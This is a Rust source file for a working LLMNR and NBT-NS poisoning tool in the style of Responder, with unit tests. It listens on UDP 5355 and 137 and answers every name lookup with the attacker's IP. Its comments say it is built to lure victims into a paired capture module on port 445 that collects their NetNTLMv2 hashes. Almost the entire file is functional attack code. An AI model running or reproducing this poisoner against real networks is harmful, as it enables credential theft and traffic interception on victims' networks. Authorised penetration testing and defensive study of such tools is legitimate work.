//! LLMNR + NBT-NS name poisoning — the Responder "lure" side. When a host fails DNS and
//! falls back to LLMNR (UDP 5355, multicast 224.0.0.252) or NBT-NS (UDP 137, broadcast), we
//! answer with our IP; the victim then connects to us and (with `attack capture` on 445) its
//! NetNTLMv2 is captured. Runs until Ctrl-C.

use anyhow::{Context, Result};
use std::net::Ipv4Addr;
use tokio::net::UdpSocket;

/// Decode a DNS-style QNAME (sequence of length-prefixed labels) to a dotted string.
fn dns_name(buf: &[u8], mut p: usize) -> Option<(String, usize)> {
    let mut labels = Vec::new();
    while let Some(&len) = buf.get(p) {
        if len == 0 {
            return Some((labels.join("."), p + 1));
        }
        let l = len as usize;
        let label = buf.get(p + 1..p + 1 + l)?;
        labels.push(String::from_utf8_lossy(label).into_owned());
        p += 1 + l;
    }
    None
}

/// Build an LLMNR response for a query, answering the requested name with `spoof`.
/// Returns None if the datagram isn't a name query we should answer.
pub fn llmnr_response(query: &[u8], spoof: Ipv4Addr) -> Option<(String, Vec<u8>)> {
    if query.len() < 12 {
        return None;
    }
    let flags = u16::from_be_bytes([query[2], query[3]]);
    let qdcount = u16::from_be_bytes([query[4], query[5]]);
    if flags & 0x8000 != 0 || qdcount == 0 {
        return None; // a response, or no question
    }
    let (name, after) = dns_name(query, 12)?;
    let qend = after + 4; // QTYPE(2) + QCLASS(2)
    if query.len() < qend {
        return None;
    }
    let question = &query[12..qend];
    let mut r = Vec::new();
    r.extend_from_slice(&query[0..2]); // transaction id
    r.extend_from_slice(&0x8000u16.to_be_bytes()); // flags: response
    r.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
    r.extend_from_slice(&1u16.to_be_bytes()); // ANCOUNT
    r.extend_from_slice(&0u32.to_be_bytes()); // NSCOUNT + ARCOUNT
    r.extend_from_slice(question); // echo the question
    // Answer: repeat name, type A, class IN, TTL 30, rdlength 4, our IP.
    r.extend_from_slice(&query[12..after]); // name (labels + terminating 0)
    r.extend_from_slice(&1u16.to_be_bytes()); // TYPE A
    r.extend_from_slice(&1u16.to_be_bytes()); // CLASS IN
    r.extend_from_slice(&30u32.to_be_bytes()); // TTL
    r.extend_from_slice(&4u16.to_be_bytes()); // RDLENGTH
    r.extend_from_slice(&spoof.octets());
    Some((name, r))
}

/// Decode a first-level-encoded NetBIOS name (32 half-ASCII bytes → 16-byte name, trimmed).
fn netbios_decode(enc: &[u8]) -> String {
    let mut out = Vec::new();
    for pair in enc.chunks_exact(2) {
        let hi = pair[0].wrapping_sub(b'A');
        let lo = pair[1].wrapping_sub(b'A');
        out.push((hi << 4) | lo);
    }
    // 16 bytes: first 15 are the (space-padded) name, byte 16 is the service/type suffix.
    let name = out.get(..15).unwrap_or(&out);
    String::from_utf8_lossy(name).trim_end().to_string()
}

/// Build an NBT-NS name-query response answering with `spoof`.
pub fn nbtns_response(query: &[u8], spoof: Ipv4Addr) -> Option<(String, Vec<u8>)> {
    if query.len() < 12 + 34 + 4 {
        return None;
    }
    let flags = u16::from_be_bytes([query[2], query[3]]);
    if flags & 0x8000 != 0 {
        return None; // response
    }
    // Question name: length byte (0x20), 32 encoded bytes, null.
    if query[12] != 0x20 {
        return None;
    }
    let name = netbios_decode(&query[13..45]);
    let question = &query[12..12 + 34 + 4]; // encoded name(34) + type(2) + class(2)
    let mut r = Vec::new();
    r.extend_from_slice(&query[0..2]); // transaction id
    r.extend_from_slice(&0x8500u16.to_be_bytes()); // flags: response, authoritative
    r.extend_from_slice(&0u16.to_be_bytes()); // QDCOUNT
    r.extend_from_slice(&1u16.to_be_bytes()); // ANCOUNT
    r.extend_from_slice(&0u32.to_be_bytes()); // NSCOUNT + ARCOUNT
    r.extend_from_slice(question); // echo the name + type + class as the answer RR name
    r.extend_from_slice(&60u32.to_be_bytes()); // TTL
    r.extend_from_slice(&6u16.to_be_bytes()); // RDLENGTH
    r.extend_from_slice(&0u16.to_be_bytes()); // NB_FLAGS (B-node, unique)
    r.extend_from_slice(&spoof.octets());
    Some((name, r))
}

async fn run_llmnr(spoof: Ipv4Addr) -> Result<()> {
    let sock = UdpSocket::bind("0.0.0.0:5355").await.context("bind LLMNR :5355")?;
    sock.join_multicast_v4("224.0.0.252".parse().unwrap(), Ipv4Addr::UNSPECIFIED).ok();
    let mut buf = [0u8; 2048];
    loop {
        let (n, from) = sock.recv_from(&mut buf).await?;
        if let Some((name, resp)) = llmnr_response(&buf[..n], spoof) {
            let _ = sock.send_to(&resp, from).await;
            println!("[LLMNR] {from} asked '{name}' → answered {spoof}");
        }
    }
}

async fn run_nbtns(spoof: Ipv4Addr) -> Result<()> {
    let sock = UdpSocket::bind("0.0.0.0:137").await.context("bind NBT-NS :137")?;
    let mut buf = [0u8; 2048];
    loop {
        let (n, from) = sock.recv_from(&mut buf).await?;
        if let Some((name, resp)) = nbtns_response(&buf[..n], spoof) {
            let _ = sock.send_to(&resp, from).await;
            println!("[NBT-NS] {from} asked '{name}' → answered {spoof}");
        }
    }
}

/// Run the LLMNR + NBT-NS poisoners concurrently, spoofing every name to `spoof`.
pub async fn poison(spoof: Ipv4Addr) -> Result<()> {
    println!("[*] poisoning LLMNR (5355) + NBT-NS (137) → {spoof}  (pair with `attack capture` on 445)");
    tokio::try_join!(run_llmnr(spoof), run_nbtns(spoof))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn llmnr_answers_query_with_spoof_ip() {
        // Minimal LLMNR query for "WPAD" (type A).
        let mut q = vec![0x12, 0x34, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0];
        q.push(4);
        q.extend_from_slice(b"WPAD");
        q.push(0);
        q.extend_from_slice(&[0, 1, 0, 1]); // A, IN
        let (name, resp) = llmnr_response(&q, Ipv4Addr::new(10, 0, 0, 5)).unwrap();
        assert_eq!(name, "WPAD");
        assert_eq!(&resp[0..2], &[0x12, 0x34]); // echoed transaction id
        assert_eq!(u16::from_be_bytes([resp[2], resp[3]]), 0x8000); // response flag
        assert_eq!(&resp[resp.len() - 4..], &[10, 0, 0, 5]); // our IP in the answer
    }

    #[test]
    fn llmnr_ignores_responses() {
        let q = vec![0, 0, 0x80, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0];
        assert!(llmnr_response(&q, Ipv4Addr::LOCALHOST).is_none());
    }

    #[test]
    fn netbios_decode_roundtrips_known_name() {
        // "FILESERVER" encoded: each nibble + 'A'. Build the encoding for a padded 16-byte name.
        let mut name = b"FILESERVER".to_vec();
        name.resize(15, b' ');
        name.push(0x00); // 16th byte = service/type
        let enc: Vec<u8> = name.iter().flat_map(|b| [b'A' + (b >> 4), b'A' + (b & 0x0f)]).collect();
        assert_eq!(netbios_decode(&enc), "FILESERVER");
    }
}
